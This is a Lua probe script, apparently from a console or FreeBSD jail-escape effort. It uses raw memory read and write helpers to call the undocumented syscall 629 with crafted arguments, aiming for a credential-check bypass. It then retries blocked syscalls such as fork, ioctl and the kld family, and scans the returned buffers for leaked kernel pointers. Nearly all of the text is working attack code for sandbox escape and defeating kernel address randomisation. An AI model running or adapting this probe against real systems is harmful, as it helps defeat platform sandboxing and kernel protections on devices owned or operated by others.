-- CRASH_CLASS: MODERATE
-- PROBE 54b: Test sys 629 jail bypass (arg0=1 fast path)
--
-- Context: Byte-verified `cmpq $1,(%rsi)` at handler body+0xb.
-- If arg0=1 takes a fast path that skips credential checks,
-- it could unlock previously blocked syscalls. After testing 629,
-- we retry syscalls that previously returned -1.

print("=== PROBE 54b: JAIL BYPASS + BLOCKED SYSCALL RETRY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc629 = make_syscall(629)
local outbuf = memory.alloc(0x1000)

-- Phase 1: Test sys 629 with different arg0 values
print("[*] Phase 1: Testing sys 629 argument patterns")
print("")

local arg_vals = {0, 1, 2, 3, 0xFF, 0x100, 0xFFFFFFFF}
for _, argval in ipairs(arg_vals) do
    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end

    local arg_u64
    if argval >= 0x80000000 then
        arg_u64 = uint64(string.format("0x%X", argval))
    else
        arg_u64 = uint64(argval)
    end

    -- Try: 629(arg0_val, 0, 0, 0, 0, 0)
    local ok, ret = pcall(function()
        return sc629(arg_u64, uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        print(string.format("  629(0x%X, 0,0,0,0,0) = %d (%s)", argval, signed32(ret), hexval(ret)))
    else
        print(string.format("  629(0x%X, 0,0,0,0,0) CRASHED: %s", argval, tostring(ret)))
    end
end
print("")

-- Try with arg0 as pointer to value (cmpq $1,(%rsi) dereferences arg1 in rsi)
-- FreeBSD ABI: arg1->rdi, arg2->rsi. So the cmpq $1,(%rsi) checks *arg2
print("[*] Phase 1b: Testing with arg2 as pointer to value")
print("")
local valbuf = memory.alloc(64)
for _, testval in ipairs({0, 1, 2, 3}) do
    safe_wd(valbuf, testval)
    safe_wd(valbuf + 4, 0)
    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end

    local ok, ret = pcall(function()
        return sc629(uint64(0), uint64(valbuf), uint64(outbuf), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        print(string.format("  629(0, &%d, outbuf) = %d  buf[0]=%s", testval, rv, hexval(q0)))
        if rv == 0 then
            print("  >>> SUCCESS with *arg2 = " .. testval)
        end
    else
        print(string.format("  629(0, &%d, outbuf) CRASHED: %s", testval, tostring(ret)))
    end

    -- Also try: arg1=valbuf (FreeBSD syscall: first user arg -> rdi)
    local ok2, ret2 = pcall(function()
        return sc629(uint64(valbuf), uint64(0), uint64(outbuf), uint64(0), uint64(0), uint64(0))
    end)
    if ok2 then
        local rv2 = signed32(ret2)
        print(string.format("  629(&%d, 0, outbuf) = %d", testval, rv2))
        if rv2 == 0 then
            print("  >>> SUCCESS with *arg1 = " .. testval)
        end
    else
        print(string.format("  629(&%d, 0, outbuf) CRASHED: %s", testval, tostring(ret2)))
    end
end
print("")

-- Phase 2: If 629 returned 0 for any pattern, retry previously blocked syscalls
print("[*] Phase 2: Retesting previously blocked syscalls")
print("")
local blocked = {
    {2,   "fork"},
    {251, "rfork"},
    {430, "thr_new"},
    {54,  "ioctl"},
    {90,  "dup2"},
    {306, "kldfind"},
    {307, "kldnext"},
    {308, "kldstat"},
    {309, "kldfirstmod"},
    {310, "kldsym"},
    {556, "cpuset_getid"},
    {484, "kenv"},
}

for _, entry in ipairs(blocked) do
    local num = entry[1]
    local name = entry[2]
    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end

    local sc = make_syscall(num)
    local ok, ret = pcall(function()
        return sc(uint64(0), uint64(outbuf), uint64(64), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        print(string.format("  %3d %-15s ret=%d  buf[0]=%s", num, name, rv, hexval(q0)))
        if rv == 0 then
            print("  >>> NEWLY ACCESSIBLE: " .. name)
        end
        -- Check for kernel pointers
        for i = 0, 56, 8 do
            local qv = safe_rq(outbuf + i)
            if qv then
                local h, l = get_hi_lo(qv)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print(string.format("  >>> KPTR at +%d: %s", i, hexval(qv)))
                end
            end
        end
    else
        print(string.format("  %3d %-15s CRASHED: %s", num, name, tostring(ret)))
    end
end

print("")
print("=== PROBE 54b COMPLETE ===")
